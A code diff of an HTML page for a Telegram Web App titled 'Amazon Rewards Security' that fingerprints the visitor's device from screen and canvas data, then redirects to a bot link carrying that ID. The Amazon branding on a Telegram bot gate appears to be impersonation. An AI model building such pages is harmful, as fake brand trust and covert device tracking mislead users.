@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Amazon Pay Security</title>
+    <title>Amazon Rewards Security</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             box-sizing: border-box;
@@ -44,6 +44,7 @@
             justify-content: center;
             font-size: 38px;
             margin: 0 auto 20px;
+            transition: all 0.3s ease;
         }
         .badge-verified {
             background: linear-gradient(135deg, #10b981, #059669) !important;
@@ -85,7 +86,10 @@
             font-weight: 700;
             cursor: pointer;
         }
-        .status-box {
+        .btn-action:active {
+            transform: scale(0.98);
+        }
+        .status-success {
             display: none;
             margin-top: 15px;
             padding: 12px;
@@ -109,11 +113,11 @@
             <div class="tag">● Anti-Clone Gateway</div>
         </div>
 
-        <button class="btn-action" id="actionBtn" onclick="runCheck()">
+        <button class="btn-action" id="actionBtn" onclick="runDirectVerification()">
             ⚡ Authorize Device Now 🛡️
         </button>
 
-        <div class="status-box" id="statusBox">✓ Verified! Returning to bot...</div>
+        <div class="status-success" id="statusBox">✓ Verified! Returning to bot...</div>
     </div>
 
     <script>
@@ -127,23 +131,18 @@
             let id = localStorage.getItem("_tg_device_hw_id");
             if (!id) {
                 const screenSig = screen.width + "x" + screen.height + "_" + screen.colorDepth;
-                const canvasSig = (function() {
-                    try {
-                        const c = document.createElement("canvas");
-                        const ctx = c.getContext("2d");
-                        ctx.font = "14px Arial";
-                        ctx.fillText("anti-fraud", 2, 2);
-                        return c.toDataURL().slice(-20);
-                    } catch(e) { return "fallback"; }
-                })();
+                const canvas = document.createElement("canvas");
+                const ctx = canvas.getContext("2d");
+                ctx.font = "14px Arial";
+                ctx.fillText("anti-fraud", 2, 2);
                 const randPart = Math.random().toString(36).substring(2, 8);
-                id = "D_" + btoa(screenSig + "_" + canvasSig).replace(/[^a-zA-Z0-9]/g, "").slice(0, 8) + "_" + randPart;
+                id = "D_" + btoa(screenSig).replace(/[^a-zA-Z0-9]/g, "").slice(0, 8) + "_" + randPart;
                 localStorage.setItem("_tg_device_hw_id", id);
             }
             return id;
         }
 
-        function runCheck() {
+        function runDirectVerification() {
             const btn = document.getElementById("actionBtn");
             const badge = document.getElementById("badge");
             const title = document.getElementById("title");
@@ -151,11 +150,11 @@
             const box = document.getElementById("statusBox");
 
             btn.disabled = true;
-            btn.innerText = "Redirecting...";
+            btn.innerText = "Activating...";
             badge.innerText = "✓";
             badge.classList.add("badge-verified");
             title.innerText = "Hardware Authorized";
-            desc.innerText = "Activating bot dashboard...";
+            desc.innerText = "Opening dashboard in chat...";
             box.style.display = "block";
 
             const urlParams = new URLSearchParams(window.location.search);
@@ -164,13 +163,14 @@
 
             const targetUrl = "https://t.me/" + botUsername + "?start=v_" + devId;
 
-            // Direct link switch & close
+            // Direct Telegram deep redirection
             if (tg && tg.openTelegramLink) {
                 tg.openTelegramLink(targetUrl);
             } else {
                 window.location.href = targetUrl;
             }
 
+            // Window close
             setTimeout(() => {
                 if (tg) tg.close();
             }, 300);
